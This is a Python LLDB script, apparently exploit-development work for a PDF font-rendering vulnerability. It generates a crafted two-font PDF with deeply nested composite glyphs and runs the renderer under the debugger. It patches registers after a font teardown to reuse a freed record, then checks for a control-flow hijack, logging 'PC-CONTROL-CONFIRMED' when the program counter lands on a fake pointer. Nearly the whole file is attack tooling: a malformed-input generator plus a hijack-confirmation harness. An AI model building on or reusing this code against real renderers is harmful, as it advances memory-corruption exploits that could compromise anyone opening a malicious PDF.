# RIP-35: TWO-FONT RECORD-REUSE HIJACK.
# PDF: F1 (L=1000) + F2 (L=1001), content draws both.
# FIN#1 (F1 teardown) -> capture record obj O1.
# F2's render stores (+2540): patch x2=O1+0x18, x0=FAKEPTR at every stop.
# FIN#2 (F2 teardown): if x8==FAKEPTR -> continue into blraaz -> PC watch.
import os, sys, struct, time, subprocess
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
CVE = os.path.dirname(CWD) + "/cve-2026-86950"
sys.path.insert(0, CVE)
TRACE = open(os.path.join(CWD, "rip35_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()
FAKEPTR = 0x515100000

# ---- build 2-font PDF ----
build_2fonts = r'''
import sys
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen
UPM, N, DX = 16384, 9, 33
SCALE = 32767 / 16384
def _leaf(L):
    p = TTGlyphPen(None)
    p.moveTo((0,0)); p.lineTo((DX,0)); p.lineTo((DX,40)); p.lineTo((0,40)); p.closePath()
    p.moveTo((L,1)); p.lineTo((L,39)); p.closePath()
    return p.glyph()
def build_ttf(path, L):
    names = [".notdef", "leafA"] + ["cA%d" % i for i in range(1, N)] + ["A"]
    fb = FontBuilder(UPM, isTTF=True)
    fb.setupGlyphOrder(names)
    fb.setupCharacterMap({ord("A"): "A"})
    glyf = {".notdef": TTGlyphPen(None).glyph(), "leafA": _leaf(L)}
    p = TTGlyphPen(glyf); p.moveTo((1,0)); p.lineTo((1,1)); p.closePath()
    glyf[".notdef"] = p.glyph()
    prev = "leafA"
    for i in range(1, N):
        nm = "cA%d" % i
        p = TTGlyphPen(glyf); p.addComponent(prev, (SCALE,0,0,SCALE,0,0))
        glyf[nm] = p.glyph(); prev = nm
    p = TTGlyphPen(glyf); p.addComponent(prev, (SCALE,0,0,SCALE,0,0))
    glyf["A"] = p.glyph()
    fb.setupGlyf(glyf)
    fb.setupHorizontalMetrics({n: (100,0) for n in names})
    fb.setupHorizontalHeader(ascent=100, descent=-100)
    fb.setupOS2(); fb.setupNameTable({"familyName":"T%d"%L,"styleName":"R"}); fb.setupPost()
    fb.font["maxp"].maxComponentDepth = N
    fb.font.recalcBBoxes = False
    for g in glyf.values():
        g.xMin = g.yMin = 0; g.xMax = DX; g.yMax = 40
    fb.font["head"].xMin = 0; fb.font["head"].xMax = DX
    fb.font["head"].yMin = 0; fb.font["head"].yMax = 40
    fb.save(path)
def build_pdf2(path, fa, fb_, La, Lb):
    ta = open(fa,"rb").read(); tb = open(fb_,"rb").read()
    objs = []
    def add(b): objs.append(b); return len(objs)
    cat = add(b""); pgs = add(b""); pg = add(b"")
    f1 = add(b""); d1 = add(b""); s1 = add(b"")
    f2 = add(b""); d2 = add(b""); s2 = add(b"")
    c = add(b"")
    def fontobj(fid, did, sid, blob, name):
        objs[fid-1] = b"<< /Type /Font /Subtype /TrueType /BaseFont /%s /FirstChar 65 /LastChar 65 /Widths [1000] /FontDescriptor %d 0 R /Encoding /WinAnsiEncoding >>" % (name, did)
        objs[did-1] = b"<< /Type /FontDescriptor /FontName /%s /Flags 4 /FontBBox [0 0 32000 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 40 /StemV 80 /FontFile2 %d 0 R >>" % (name, sid)
        objs[sid-1] = b"<< /Length %d /Length1 %d >>\nstream\n" % (len(blob), len(blob)) + blob + b"\nendstream"
    fontobj(f1, d1, s1, ta, b"FA")
    fontobj(f2, d2, s2, tb, b"FB")
    content = b"BT /F1 1024 Tf 5 5 Td (A) Tj ET BT /F2 1024 Tf 5 5 Td (A) Tj ET"
    objs[c-1] = b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream"
    objs[cat-1] = b"<< /Type /Catalog /Pages %d 0 R >>" % pgs
    objs[pgs-1] = b"<< /Type /Pages /Kids [%d 0 R] /Count 1 >>" % pg
    objs[pg-1] = b"<< /Type /Page /Parent %d 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 %d 0 R /F2 %d 0 R >> >> /Contents %d 0 R >>" % (pgs, f1, f2, c)
    out = b"%PDF-1.7\n"; offs = []
    for i, o in enumerate(objs):
        offs.append(len(out)); out += b"%d 0 obj\n" % (i+1) + o + b"\nendobj\n"
    xr = len(out)
    out += b"xref\n0 %d\n" % (len(objs)+1) + b"0000000000 65535 f \n"
    for o in offs: out += b"%010d 00000 n \n" % o
    out += b"trailer\n<< /Size %d /Root %d 0 R >>\nstartxref\n%d\n%%%%EOF" % (len(objs)+1, cat, xr)
    open(path, "wb").write(out)
build_ttf("fA.ttf", 1000)
build_ttf("fB.ttf", 1001)
build_pdf2("k2two.pdf", "fA.ttf", "fB.ttf", 1000, 1001)
print("built k2two.pdf")
'''
r = subprocess.run(['./venv/bin/python', '-c', build_2fonts], cwd=CVE, capture_output=True, text=True)
T("font build rc=%d %s" % (r.returncode, (r.stderr or b'').decode()[-200:] if r.returncode else 'ok'))

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.5)

def wait_stop(p, budget=25):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.05); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def safe_pc_addr(fr):
    try:
        a = fr.GetPCAddress().GetLoadAddress(t)
        if a is None or a < 0 or a >= (1 << 48): return None
        return a
    except Exception: return None

def reg(fr, name):
    r = fr.FindRegister(name)
    return r.GetValueAsUnsigned() if r and r.IsValid() else 0

def symn(fr):
    try: return fr.GetSymbol().GetName() or "?"
    except Exception: return "?"

fresh()
bf = t.BreakpointCreateByName("data_release_info")
bs = t.BreakpointCreateByName("aa_cache_render"); bs.SetOneShot(True)
p = t.LaunchSimple(["k2two.pdf", "r.png"], None, CVE)
result = "incomplete"
fins = []; stores_after_fin1 = 0; O1 = 0; patched = False
if p and p.IsValid():
    th = p.GetSelectedThread()
    pc0 = safe_pc_addr(th.GetSelectedFrame())
    bp_store = t.BreakpointCreateByAddress(pc0 + 2540) if pc0 else 0
    for i in range(1200):
        st = wait_stop(p)
        if st != lldb.eStateStopped:
            result = "ended st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1); break
        fr = p.GetSelectedThread().GetSelectedFrame()
        nm = symn(fr)
        a2 = safe_pc_addr(fr)
        off = -1
        try:
            if fr.GetSymbol() and a2:
                off = a2 - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
        except Exception: pass
        if "data_release_info" in nm:
            x0 = reg(fr, "x0"); x8 = reg(fr, "x8")
            fins.append((x0, x8))
            T("FIN#%d x0=%x x8=%x %s" % (len(fins), x0, x8, "HIJACKED" if (x8 & 0xFFFFFFFFFF) == FAKEPTR else ""))
            if len(fins) >= 2 and (fins[-1][1] & 0xFFFFFFFFFF) == FAKEPTR:
                # continue INTO the call; watch next stop for PC
                p.Continue()
                continue
            if len(fins) == 1:
                O1 = x0
            p.Continue()
        elif off == 2540:
            if O1 and fins:
                stores_after_fin1 += 1
                x2r = fr.FindRegister("x2"); x0r = fr.FindRegister("x0")
                x2r.SetValueFromCString("0x%x" % (O1 + 0x18))
                x0r.SetValueFromCString("0x%x" % FAKEPTR)
                patched = True
                if stores_after_fin1 <= 3 or stores_after_fin1 % 100 == 0:
                    T("store#%d patched x2->%x x0->%x" % (stores_after_fin1, O1 + 0x18, FAKEPTR))
            p.Continue()
        else:
            pc = safe_pc_addr(fr) or 0
            if patched and (pc & 0xFFFFFFFFFF) == FAKEPTR:
                result = "PC-CONTROL-CONFIRMED pc=%x" % pc
                T(result); killp(p); break
            desc = p.GetSelectedThread().GetStopDescription(300) or ""
            if patched and "EXC_BAD_ACCESS" in desc:
                fa = 0
                if "address=" in desc:
                    try: fa = int(desc.split("address=")[1].split(")")[0], 16)
                    except Exception: pass
                if (fa & 0xFFFFFFFFFF) == FAKEPTR:
                    result = "PC-CONTROL-CONFIRMED fault-at-FAKEPTR fa=%x" % fa
                    T(result); killp(p); break
            p.Continue()
    killp(p)
    if len(fins) < 2 and stores_after_fin1 == 0:
        result = "only-%d-FINs, %d stores-after-FIN1 (reuse theory needs more)" % (len(fins), stores_after_fin1)
T("fins=%s" % [(hex(a2), hex(b2)) for a2, b2 in fins])
T("RESULT: %s (stores_after_fin1=%d patched=%s)" % (result, stores_after_fin1, patched))
T("RIP-35 DONE")
TRACE.close()
